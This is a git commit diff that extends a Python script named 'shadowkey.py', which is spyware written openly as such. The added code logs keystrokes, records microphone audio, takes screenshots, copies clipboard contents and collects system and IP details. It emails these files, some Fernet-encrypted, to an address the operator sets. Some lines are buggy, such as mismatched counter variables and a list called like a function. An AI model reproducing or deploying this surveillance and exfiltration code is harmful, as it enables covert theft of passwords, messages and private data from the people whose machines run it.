2a94ddd837d4b85d6cf600f515d38637bfdc4544
SMUGLER79 <rvvgharat@gmail.com>
2025-03-08 20:36:14 +0530

    major changes

--- shadowkey.py
+++ shadowkey.py
@@ -26,17 +26,30 @@ from requests import get #for HTTP
 from multiprocessing import Process, freeze_support
 from PIL import ImageGrab #get screenshots
 
-keyInfo = "filename"
-filePath = "filepath"
-extend = "\\"
 
-count = 0
-keys = []
+keyInfoFile = "key_log.log" #Logger Info File
+systemInfoFile = "systemInfo.log" #System info file
+clipboardInfoFile = "clipboardInfo.log" #clipboard Info File
+micDataFile = "micData.wav" #Audio Recording File
+screenshotDataFile = "screenshot.png" #Screenshot File
+
+filePath = "filename"
+extend = "\\"
+fileMerge = filePath + extend
+
+keyInfoFile_e = "e_key_log.log"
+systemInfoFile_e = "e_systemInfo.log"
+clipboardInfoFile_e = "e_clipboardInfo.log"
+
+micTime = 10
+timeIteration = 10
 
 #Credentials
-"""Add your credentials here for emailID, emailPassword and toAddr"""
+emailID = ""
+emailPassword = ""
+toAddr = ""
 
-# #Email Functionality
+#Features Function
 def sendEmail(filename, attachment, toAddr):
     fromAddr = emailID
     msg = MIMEMultipart()
@@ -66,40 +79,129 @@ def sendEmail(filename, attachment, toAddr):
     s.sendmail(fromAddr, toAddr, text)
     s.quit()
 
-sendEmail(keyInfo, filePath + extend + keyInfo, toAddr)
+
+def computerInfo():
+    with open(filePath + extend +systemInfoFile, 'a') as f:
+        hostname = socket.gethostname()
+        IPAddr = socket.gethostbyname(hostname)
+        try:
+            publicIP = get("https://api.ipify.org").text
+            f.write("Public IP Address: " + publicIP + '\n')
+        
+        except Exception:
+            f.write("Couldn't get Public IP Address")
+        
+        f.write("Processor Information: " + (platform.processor())+ '\n')
+        f.write("System Information: " + (platform.system()) + " " + platform.version() + '\n')
+        f.write("Machine Information: " + (platform.machine())+ '\n')
+        f.write("Hostname: " + hostname + '\n')
+        f.write("Private IP Address: " + IPAddr + '\n')
+
+computerInfo()
+
+
+def clipboard():
+    with open(filePath + extend + clipboardInfoFile, 'a') as f:
+        try:
+            win32clipboard.OpenClipboard()
+            pastedData = win32clipboard.GetClipboardData()
+            win32clipboard.CloseClipboard()
+
+            f.write("Clipboard Data: \n" + pastedData)
+        
+        except:
+            f.write("Clipboard could not be coppied")
+
+
+def micData():
+    fs = 44100 #frequency
+    seconds = micTime
+
+    myRecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
+    sd.wait()
+    
+    write(filePath + extend + micDataFile, fs, myRecording)
+
+
+
+def screenshot():
+    im = ImageGrab.grab()
+    im.save(filePath + extend + screenshotDataFile)
+    time.sleep(10)
 
 
 #Key Logging
-def onPress(key):
-    global keys, count
-    print(key)
-    keys.append(key)
-    count += 1
+numOfIterationsEnd = 5
+numOfIterations = 0
+currentTime = time.time()
+stoppingTime = time.time() + timeIteration
 
-    if count >= 1:
-        count = 0
-        writeFile(keys)
-        keys = []
+while numOfIterations < numOfIterationsEnd:
+    count = 0
+    keys = []
 
+    def onPress(key):
+        global keys, count, currentTime
+        keys.append(key)
+        count += 1
+        currentTime = time.time()
 
-def writeFile(keys):
-    with open(filePath + extend + keyInfo, "a") as logFile:
-        for key in keys:
-            k = str(key).replace("'", "")
-            if k.find("space") > 0:
-                logFile.write('\n')
-                logFile.close()
-
-            elif k.find("Key") == -1:
-                logFile.write(k)
-                logFile.close()                
+        if count >= 1:
+            count = 0
+            writeFile(keys)
+            keys = []
 
 
-def onRelease(key):
-    if key == Key.esc:
-        return False
+    def writeFile(keys):
+        with open(filePath + extend + keyInfoFile, "a") as logFile:
+            for key in keys:
+                k = str(key).replace("'", "")
+                if k.find("space") > 0:
+                    logFile.write('\n')
+                    logFile.close()
+
+                elif k.find("Key") == -1:
+                    logFile.write(k)
+                    logFile.close()                
 
 
-with Listener(on_press=onPress, on_release=onRelease) as listener:
-    listener.join()
+    def onRelease(key):
+        if key == Key.esc:
+            return False
+        
+        if currentTime > stoppingTime:
+            return False
 
+
+    with Listener(on_press=onPress, on_release=onRelease) as listener:
+        listener.join()
+
+    if currentTime > stoppingTime:
+        with open(filePath + extend + keyInfoFile, 'w') as f:
+            f.write(" ")
+
+        screenshot()
+        sendEmail(keyInfoFile, filePath + extend + keyInfoFile, toAddr)
+        clipboard()
+        numOfIterations += 1
+        
+        currentTime = time.time()
+        stoppingTime = time.time() + timeIteration
+
+
+filesToEncrypt = [fileMerge + systemInfoFile, fileMerge + clipboardInfoFile, fileMerge + keyInfoFile]
+encryptedFileNames = [fileMerge + systemInfoFile_e, fileMerge + clipboardInfoFile_e, fileMerge + keyInfoFile_e]
+
+count2 = 0
+
+for encryptingFile in filesToEncrypt:
+    with open(filesToEncrypt[count2], 'rb') as f:
+        data = f.read()
+
+    fernet = Fernet(key)
+    encrypted = fernet.encrypt(data)
+
+    with open(encryptedFileNames[count], 'wb') as f:
+        f.write(encrypted)
+    
+    sendEmail(encryptedFileNames(count), encryptedFileNames[count], toAddr)
